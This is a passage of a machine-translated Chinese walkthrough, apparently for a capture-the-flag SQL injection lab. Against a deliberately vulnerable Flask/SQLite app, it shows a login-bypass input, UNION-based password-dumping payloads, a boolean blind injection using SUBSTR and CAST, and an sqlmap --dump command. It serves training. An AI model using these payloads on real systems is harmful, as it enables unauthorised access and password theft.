kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/8d937e9f1e180672063b9d67a9f0f0b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:806/format:webp/1*0iyaOR9NTl1RngsJneJ9NA.png"/></div></figure><p id="87ad" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">正如下面可以看到的，用户表包含以下列:UID、name、profileID、salary、passportNr、email、nickName和password:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pb"><img src="../Images/67f968e722fde9433d5bcf09fb1ec41f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eKoGfDKXWq-NMLz7wF6rUw.png"/></div></div></figure><p id="4407" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过知道列的名称，我们可以从数据库中提取我们想要的数据。例如，下面的查询将从secrets中提取profileID、名称和密码。子查询使用<a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"> group_concat() </a>函数同时转储所有信息，而<a class="ae kr" href="https://sqlite.org/lang_expr.html#operators" rel="noopener ugc nofollow" target="_blank"> || </a>运算符是“concatenate”——它将操作数<strong class="ku ir">(</strong><a class="ae kr" href="https://sqlite.org/lang_expr.html#operators" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">sqlite.org</strong></a><strong class="ku ir">)的字符串连接在一起。</strong></p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="8c1e" class="lo lp iq mz b gy nd ne l nf ng">',nickName=(SELECT group_concat(id || "," || author|| "," || secret|| ":") from secrets),email='</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/2c5033867e89a8c9f1d5c01a3dfc230a.png" data-original-src="https://miro.medium.com/v2/resize:fit:842/format:webp/1*IxxHH7Kv5jCvNuXWMc7rdQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pc"><img src="../Images/b1baaa4dc5aa8a5754b6f060f11f971a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eQLwaxB6eppxgjoTXpadMA.png"/></div></div></figure><p id="96eb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们得到了<strong class="ku ir">标志</strong></p><h1 id="3362" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务4:易受攻击的启动:身份验证被破坏</h1><p id="e0ef" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">从<a class="ae kr" href="http://MACHINE_IP:5000," rel="noopener ugc nofollow" target="_blank"> http://10.10.110.236:5000，</a>上的登陆页面，转到“跟踪:易受攻击的启动”(<a class="ae kr" href="http://10.10.110.236:5000/challenge1/" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 110 . 236:5000/challenge 1/</a>)下的“已破坏的认证”。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/9fd64fa8f1cbd1556ff2104c0085ae3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:686/format:webp/1*40lOA1erdwIY464aY1UjoA.png"/></div></figure><p id="40eb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">绕过登录并检索标志。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/fbeacc06ab0b50b45b8e3be672879288.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*K2E7rZLQKZJeisfx4p0POQ.png"/></div></figure><h1 id="5b63" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务5:易受攻击的启动:身份验证被破坏2</h1><h1 id="2649" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="6720" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">这个挑战建立在之前的挑战之上。这里的目标是找到一种方法，在不使用盲目注入的情况下，转储数据库中的所有密码来检索标志。</p><h1 id="775b" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="146d" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">登录表单仍然易受SQL注入攻击，使用<strong class="ku ir"> ' </strong> <strong class="ku ir">或1 = 1—</strong>作为用户名可以绕过登录。</p><p id="3bb4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在转储所有密码之前，我们需要确定登录查询的结果在应用程序中返回的位置。登录后，当前登录用户的名称显示在右上角，因此可以将数据转储到那里，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/e2a7155754b8397e413fb679dbb5bd7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:662/format:webp/1*BPpcMWTDjU_dOMaNLuyCEw.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/90b6a546a78474f1d1f92f131f93018b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*dRA6Lz-p_lKd1tKu.png"/></div></div></figure><p id="bffa" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">来自查询的数据也可以存储在会话cookie中。可以通过在浏览器中打开开发人员工具来提取会话cookie，这可以通过按F12来完成。然后导航到存储并复制会话cookie的值，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pg"><img src="../Images/0d1bf711e5f63c1cf4961dc1e41be840.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qvFNwpmqCq7RQ9Q1Rjog-A.png"/></div></div></figure><p id="0f75" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后可以在<a class="ae kr" href="https://www.kirsle.net/wizards/flask-session.cgi" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir"/></a>或通过自定义脚本对cookie进行解码。可以通过访问<a class="ae kr" href="http://10.10.110.236:5000/download/decode_cookie.py" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">http://10 . 10 . 110 . 236:5000/download/decode _ cookie . py</strong></a>在虚拟机内部下载用于解码cookie的脚本。</p><p id="1891" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">以<strong class="ku ir">或1 = 1—</strong>作为用户名登录后，可以在下面看到解码后的cookie，很明显来自登录查询的用户id和用户名放在其中。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/ed44c3c2a571b4cce03663aae2b9dcea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1072/format:webp/1*Iic7yvgDFfljIL7MlLBfgA.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/0aa91707ade80c492391c6a9eb8d2fa9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1208/format:webp/1*1JhY8znrlzLUPHDNDFzOsg.png"/></div></figure><p id="70de" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用基于联盟的SQL注入可以转储密码。要使基于工会的注入发挥作用，必须满足两个关键要求:</p><ul class=""><li id="63a8" class="pj pk iq ku b kv kw ky kz lb pl lf pm lj pn ln po pp pq pr bi translated">注入查询中的列数必须与原始查询中的列数相同</li><li id="fad9" class="pj pk iq ku b kv ps ky pt lb pu lf pv lj pw ln po pp pq pr bi translated">每列的数据类型必须与相应的类型相匹配</li></ul><p id="994b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当登录到应用程序时，它执行下面的查询。从SQL语句中，我们可以看到它正在检索两列；id和用户名。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="4cc8" class="lo lp iq mz b gy nd ne l nf ng">SELECT <strong class="mz ir">id</strong>, username FROM users WHERE username = '" + username + "' AND password = '" + password + "'</span></pre><p id="a350" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">一个一个地试试这个</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="160c" class="lo lp iq mz b gy nd ne l nf ng">1' UNION SELECT NULL-- -</span><span id="1317" class="lo lp iq mz b gy nh ne l nf ng">1' UNION SELECT NULL, NULL-- -</span><span id="6e17" class="lo lp iq mz b gy nh ne l nf ng">1' UNION SELECT NULL, NULL, NULL-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi px"><img src="../Images/795dfcb2d8bdb7ccb947ab290aaf3255.png" data-original-src="https://miro.medium.com/v2/resize:fit:716/format:webp/1*BmasvN3w0XEkRS7FPFPpAQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi py"><img src="../Images/f239b2d0b89d3f2c94365e9942480ddf.png" data-original-src="https://miro.medium.com/v2/resize:fit:782/format:webp/1*cuzgdbZhfT0hUIvoG9NGNg.png"/></div></figure><p id="c339" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">它显示查询已执行。在这种情况下，成功意味着当注入正确数量的列时，应用程序将成功登录。在其他情况下，如果启用了错误消息，当注入的列数不正确时，可能会显示一条警告，指出“UNION左侧和右侧的选择没有相同的结果列数”。</p><p id="e88a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过使用<strong class="ku ir"> ' UNION SELECT 1，2 — - </strong>作为用户名，我们匹配了原始SQL查询中的列数，应用程序允许我们进入。登录后，我们可以看到用户名被替换为整数2，这是我们在注入查询中用作第二列的内容。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pz"><img src="../Images/40d8d3a415733bb40226c5edf6e435e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:704/format:webp/1*Rs83arR9OoDKTvRm_Pxuzg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qa"><img src="../Images/34bc48e8725fe4651652d36885e75cd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ri37zo9gTGXJ-5gWRAZDZw.png"/></div></div></figure><p id="b5fb" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">会话cookie中的用户名也是如此。通过解码，我们可以看到用户名已经被替换为与上面相同的值</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qb"><img src="../Images/f3504468476dbfb9b002940d5d06673e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ro9W7h8QQa4n-DJK_ks55g.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/1d2e8257211cd9ea31cc329f1e28dbf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1026/format:webp/1*FGaK6MHAdeut0-hMQH5h_Q.png"/></div></figure><p id="74dc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">枚举数据库以查找表和列，就像我们在任务2 SQL注入介绍中所做的那样。像<a class="ae kr" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">payloads all things</strong></a><strong class="ku ir"/>这样的备忘单对此很有帮助。挑战的目标是转储所有密码以获得标志，所以在这种情况下，我们将猜测列名为<em class="oq">密码</em>，表名为<em class="oq">用户</em>。按照这种逻辑，可以使用以下代码转储密码:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="9e15" class="lo lp iq mz b gy nd ne l nf ng">' UNION SELECT 1, password from users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/1d583613e383a6459528c1a2aba4846f.png" data-original-src="https://miro.medium.com/v2/resize:fit:682/format:webp/1*_iIZWMHu3EA0aKpDA0vMpA.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qe"><img src="../Images/30438f4776a3ab91c3cbe842e0ac045c.png" data-original-src="https://miro.medium.com/v2/resize:fit:832/format:webp/1*LhOc1JS4YjjjipSrsrrQWA.png"/></div></figure><p id="f558" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，前面的语句只会返回一个密码。<a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"> group_concat() </a>函数可以帮助实现同时转储所有密码的目标。</p><p id="7a0d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过将以下代码插入用户名字段:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="31ad" class="lo lp iq mz b gy nd ne l nf ng">' UNION SELECT 1,group_concat(password) FROM users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qf"><img src="../Images/a6920612675818281abfccec0e618918.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QAmdkWGzACCyBohHbX_OjA.png"/></div></div></figure><p id="53ba" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们拿到了<strong class="ku ir">国旗</strong></p><h1 id="dc9e" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务6:易受攻击的启动:被破坏的认证3(盲目注入)</h1><h1 id="591e" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="0e7f" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">这个挑战和前一个挑战有相同的弱点。但是，不再可能从Flask会话cookie或通过用户名显示提取数据。登录表单仍然有同样的漏洞，但这一次的目标是滥用与盲目SQL注入登录表单提取管理员的密码。</p><h1 id="2a36" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="810c" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">基于布尔的盲SQL注入将用于提取密码。手动盲注既繁琐又耗时，因此计划构建一个脚本来逐字符提取密码。在制作自动化注入的脚本之前，理解注入是如何工作的是至关重要的。这个想法是发送一个SQL查询，询问密码中每个字符的真假。将分析应用程序的响应，以了解数据库返回的是真还是假。在这种情况下，如果响应成功，应用程序将让我们进入，或者在返回false的情况下，它将停留在登录页面上，显示“无效的用户名或密码”，如下图所示。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qg"><img src="../Images/4f2fe00f12083099e36d4abf3931cfac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*4stRgpKBAodvOwdK.png"/></div></div></figure><p id="81ee" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如前所述，我们将向数据库发送密码中每个字符的布尔问题，询问数据库我们是否已经猜出了正确的字符。为了实现这一点，我们需要一种方法来控制我们所在的字符，并在每次我们猜测到当前位置的正确字符时递增它。SQLite的<a class="ae kr" href="https://sqlite.org/lang_corefunc.html#substr" rel="noopener ugc nofollow" target="_blank"> substr </a>函数可以帮助我们实现这个功能。</p><p id="8b34" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">" SQLite substr函数从一个字符串中返回一个从指定位置开始的具有预定义长度的子字符串."(<a class="ae kr" href="https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/" rel="noopener ugc nofollow" target="_blank"> SQLite教程</a>)</p><p id="92ee" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">substr的第一个参数是字符串本身，它将是管理员的密码。第二个参数是起始位置，第三个参数是将要返回的子字符串的长度。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="ba5c" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR( string, &lt;start&gt;, &lt;length&gt;)</span></pre><p id="a3e5" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下面是一个使用中的<a class="ae kr" href="https://sqlite.org/lang_corefunc.html#substr" rel="noopener ugc nofollow" target="_blank"> substr </a>的例子——等号(=)后面的字符表示返回的子字符串。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="fa03" class="lo lp iq mz b gy nd ne l nf ng">-- Changing start</span><span id="2ab0" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 1,1) = T</span><span id="6904" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 2,1) = H</span><span id="06e1" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 3,1) = M</span><span id="ece8" class="lo lp iq mz b gy nh ne l nf ng">-- Changing length</span><span id="1f6d" class="lo lp iq mz b gy nh ne l nf ng">SUBSTR("THM{Blind}", 1,3) = THM</span></pre><p id="b146" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下一步是将管理员的密码作为字符串输入到<a class="ae kr" href="https://sqlite.org/lang_corefunc.html#substr" rel="noopener ugc nofollow" target="_blank"> substr </a>函数中。这可以通过以下查询实现:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="d990" class="lo lp iq mz b gy nd ne l nf ng">(SELECT password FROM users LIMIT 0,1)</span></pre><p id="0c34" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><a class="ae kr" href="https://sqlite.org/lang_select.html#limitoffset" rel="noopener ugc nofollow" target="_blank"> LIMIT </a>子句用于限制SELECT语句返回的数据量。第一个数字0是偏移量，第二个整数是限值:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="93be" class="lo lp iq mz b gy nd ne l nf ng">LIMIT &lt;OFFSET&gt;, &lt;LIMIT&gt;</span></pre><p id="783f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">下面是几个关于<a class="ae kr" href="https://sqlite.org/lang_select.html#limitoffset" rel="noopener ugc nofollow" target="_blank">限制</a>条款的例子。右边的表代表用户表。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="c315" class="lo lp iq mz b gy nd ne l nf ng">sqlite&gt; SELECT password FROM users LIMIT 0,1</span><span id="344e" class="lo lp iq mz b gy nh ne l nf ng">THM{Blind}</span><span id="ef37" class="lo lp iq mz b gy nh ne l nf ng">sqlite&gt; SELECT password FROM users LIMIT 1,1</span><span id="9250" class="lo lp iq mz b gy nh ne l nf ng">Summer2019!</span><span id="d72f" class="lo lp iq mz b gy nh ne l nf ng">sqlite&gt; SELECT password FROM users LIMIT 0,2</span><span id="d142" class="lo lp iq mz b gy nh ne l nf ng">THM{Blind}</span><span id="91cc" class="lo lp iq mz b gy nh ne l nf ng">Summer2019!</span></pre><p id="fe02" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">THM { Blind }夏季！维京123</p><p id="1126" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">返回管理员密码第一个字符的SQL查询如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="fd01" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)</span></pre><p id="34c4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">现在我们需要一种方法来比较密码的第一个字符和我们猜测的值。比较字符很容易，我们可以这样做:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="395d" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'</span></pre><p id="bdf7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然而，这种方法是否有效将取决于应用程序如何处理输入。对于这个挑战，应用程序将用户名转换为小写，这打破了前面提到的方法，因为大写T与小写T不同。ASCII T的十六进制表示是0x54，小写T是0x74。为了处理这个问题，我们可以通过替换类型<a class="ae kr" href="https://www.sqlite.org/printf.html#substitution_types" rel="noopener ugc nofollow" target="_blank"> X </a>将字符输入为十六进制表示，然后使用SQLite的<a class="ae kr" href="https://sqlite.org/lang_expr.html#castexpr" rel="noopener ugc nofollow" target="_blank"> CAST </a>表达式将值转换为数据库期望的数据类型。</p><p id="e5e7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">" X，X:参数是以十六进制显示的整数。小写的十六进制用于%x，大写的用于% X”“(<a class="ae kr" href="https://www.sqlite.org/printf.html#substitution_types" rel="noopener ugc nofollow" target="_blank">sqlite.org</a>)</p><p id="e956" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着我们可以将T输入为X'54 '。要将值转换为SQLite的文本类型，我们可以使用如下的CAST表达式:CAST(X'54' as Text)。我们最后的查询现在看起来如下:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="c434" class="lo lp iq mz b gy nd ne l nf ng">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</span></pre><p id="060e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在使用我们构建的查询之前，我们需要使它适合原始查询。我们的查询将放在用户名字段中。我们可以通过添加一个单引号(')来关闭username参数，然后附加一个and运算符来添加我们的条件。然后在查询末尾添加两个破折号(—)来注释掉密码检查。完成后，我们恶意查询如下所示:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="d1c6" class="lo lp iq mz b gy nd ne l nf ng">admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -</span></pre><p id="d441" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当将其注入用户名字段时，数据库执行的最终查询将是:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6a5f" class="lo lp iq mz b gy nd ne l nf ng">SELECT <strong class="mz ir">id</strong>, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</span></pre><p id="4bea" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如果应用程序响应302重定向，那么我们就找到了密码的第一个字符。为了获得完整的密码，攻击者必须对密码中的每个字符进行多次测试。测试每一个字符都很繁琐，使用脚本更容易实现。一个简单的解决方案是遍历每个可能的ASCII字符，并将其与数据库的字符进行比较。上述方法会产生大量流向目标的流量，但不是最有效的方法。机内提供了一个示例脚本，可以前往<a class="ae kr" href="http://10.10.110.236:5000/view/challenge3/challenge3-exploit.py" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">http://10 . 110 . 236:5000/view/challenge 3/challenge 3-exploit . py</strong></a><strong class="ku ir">查看并下载；</strong>注意，有必要使用password_len变量更改密码长度。密码的长度可以通过查询数据库找到。例如，在下面的查询中，我们询问数据库密码的长度是否等于37:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="0830" class="lo lp iq mz b gy nd ne l nf ng">admin' AND length((SELECT password from users where username='admin'))==37-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qh"><img src="../Images/bdab38fd535fc96ba1bdfa260d928a14.png" data-original-src="https://miro.medium.com/v2/resize:fit:838/format:webp/1*S4DrVla1M3viWgaT8FHPfg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qi"><img src="../Images/b4cba3332e005140ff114360d9662d70.png" data-original-src="https://miro.medium.com/v2/resize:fit:774/format:webp/1*dnT20f-wSOq7rYtMQmWU0A.png"/></div></div></figure><p id="8a89" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">此外，该脚本需要大量不必要的请求。一个额外的挑战可能是建立一个更有效的工具来检索密码。</p><p id="85e0" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">解决这一挑战的另一种方法是使用sqlmap之类的工具，这是一种开源工具，可以自动化检测和利用SQL注入缺陷的过程。以下命令可用于利用sqlmap漏洞:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="3fed" class="lo lp iq mz b gy nd ne l nf ng">sqlmap -u <a class="ae kr" href="http://10.10.110.236:5000/challenge3/login" rel="noopener ugc nofollow" target="_blank">http://10.10.110.236:5000/challenge3/login</a> --data="username=admin&amp;password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qj"><img src="../Images/f6449df6ab3024bea693919f9191ad2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1354/format:webp/1*L6UwkIGrQ0MqfDCV114PKA.png"/></div></figure><h1 id="0885" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务7:易受攻击的启动:易受攻击的注释</h1><h2 id="1a7f" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">目标</h2><p id="bdbc" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">在这里，以前的漏洞已被修复，登录表单不再容易受到SQL注入。该团队增加了一个新的注释功能，允许用户在他们的页面上添加注释。这个挑战的目标是找到漏洞并转储数据库以找到标志。</p><h2 id="c8eb" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">描述</h2><p id="5b8f" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">通过注册新帐户并登录应用程序，用户可以通过点击左上方菜单中的“Notes”来导航到新的Notes功能。在这里，可以添加新的注释，所有用户的注释都列在页面的底部，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qk"><img src="../Images/34a79d82b212c0017b53e11bdd73b448.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8Zs-rXNzksLxZAaa.png"/></div></div></figure><p id="1927" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">notes函数不是直接易受攻击的，因为插入notes的函数是安全的，因为它使用参数化查询。对于参数化查询，SQL语句首先用占位符(？)为参数。然后，用户输入被传递到查询的每个参数中。参数化查询允许数据库区分代码和数据，而不管输入是什么。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="007a" class="lo lp iq mz b gy nd ne l nf ng">INSERT INTO notes (username, title, note) VALUES (?, ?, ?)</span></pre><p id="b03c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky 